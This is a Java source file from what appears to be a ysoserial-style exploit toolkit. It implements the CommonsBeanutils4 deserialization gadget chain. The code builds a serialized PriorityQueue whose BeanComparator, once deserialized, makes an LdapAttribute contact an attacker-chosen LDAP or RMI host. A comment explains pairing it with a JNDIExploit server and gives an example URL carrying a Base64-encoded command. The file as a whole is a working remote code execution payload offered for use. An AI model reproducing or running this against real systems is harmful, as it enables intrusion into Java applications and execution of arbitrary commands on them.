package com.h2tg.ysogate.payloads.gadgets;

import com.h2tg.ysogate.utils.PayloadRunner;
import org.apache.commons.beanutils.BeanComparator;
import com.h2tg.ysogate.payloads.CommandObjectPayload;
import com.h2tg.ysogate.annotation.Dependencies;
import com.h2tg.ysogate.utils.Reflections;

import javax.naming.CompositeName;
import java.lang.reflect.Constructor;
import java.util.PriorityQueue;

/**
 * 如果配合 JNDIExploit 需要在 com.feihong.ldap.LdapServer#processSearchResult 加一行
 * base = base.replace('\\','/');
 * <p>
 * 注意不同 JDK 版本需要改 LdapAttribute 的 序列化 key，这里暂时没有实现
 * <p>
 * ldap://127.0.0.1:1389/Basic/Command/Base64/T3BlbiAtYSBDYWxjdWxhdG9yLmFwcA==
 *
 * @author su18
 */
@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "commons-collections:commons-collections:3.1"})
public class CommonsBeanutils4 implements CommandObjectPayload<Object>
{

	@Override
	public Object getObject(String command) throws Exception {

		if (command.toLowerCase().startsWith("jndi:")) {
			command = command.substring(5);
		}

		if (!command.toLowerCase().startsWith("ldap://") && !command.toLowerCase().startsWith("rmi://")) {
			throw new Exception("Command format is: [rmi|ldap]://host:port/obj");
		}

		int    index = command.indexOf("/", 7);
		String host  = command.substring(0, index);
		String path  = command.substring(index + 1);

		String query = path.replace("/", "\\");

		Class       ldapAttributeClazz            = Class.forName("com.sun.jndi.ldap.LdapAttribute");
		Constructor ldapAttributeClazzConstructor = ldapAttributeClazz.getDeclaredConstructor(new Class[]{String.class});
		ldapAttributeClazzConstructor.setAccessible(true);
		Object ldapAttribute = ldapAttributeClazzConstructor.newInstance(new Object[]{"name"});

		Reflections.setFieldValue(ldapAttribute, "baseCtxURL", host);
		Reflections.setFieldValue(ldapAttribute, "rdn", new CompositeName(query + "//su18"));

		final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);

		final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
		queue.add("1");
		queue.add("1");

		Reflections.setFieldValue(comparator, "property", "attributeDefinition");
		Reflections.setFieldValue(queue, "queue", new Object[]{ldapAttribute, ldapAttribute});

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsBeanutils4.class, args);
	}
}
